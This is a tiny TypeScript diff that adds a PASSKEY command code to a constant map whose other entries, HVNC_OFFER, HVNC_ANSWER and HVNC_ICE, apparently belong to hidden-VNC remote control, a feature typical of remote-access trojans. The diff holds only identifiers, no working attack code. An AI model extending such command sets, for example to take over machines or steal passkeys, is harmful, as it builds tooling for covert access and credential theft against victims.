@@ -129,6 +129,7 @@ export const CMD = {
    HVNC_OFFER: '0xHO',
    HVNC_ANSWER: '0xHA',
    HVNC_ICE: '0xHI',
+   PASSKEY: '0xPK',
 } as const;
 
 export type CmdType = typeof CMD[keyof typeof CMD];
